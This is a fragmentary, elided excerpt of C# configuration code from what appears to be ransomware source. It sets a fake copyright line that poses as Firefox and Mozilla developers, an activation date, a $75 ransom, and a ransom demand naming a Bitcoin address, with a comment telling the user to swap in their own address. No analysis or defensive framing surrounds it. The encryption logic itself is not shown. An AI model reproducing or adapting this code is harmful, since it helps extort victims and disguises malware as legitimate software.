...
namespace Main
{
    internal static class Config
    {
        ...
        internal const string AssemblyCopyright =
            @"Copyright 1999-2020 Firefox and Mozzilla developers. All rights reserved.";
         ...
         * Leave the same length and don't touch the "==" in the end!
        ...
        static Config()
        {
            ...
            ActiveAfterDateTime = new DateTime(2020, 10, 1);
#else
             ...
             */
            ActiveAfterDateTime = new DateTime(2020, 10, 1); // year, month, day
#endif
            ...
            RansomUsd = 75;
            TaskMessage = @"Send this amount: $" + RansomUsd + @" worth of Bitcoin to this address: 12iQF6z9SeQeSPVvcD58EA8dXezR4DYxsJ "; //change btc address
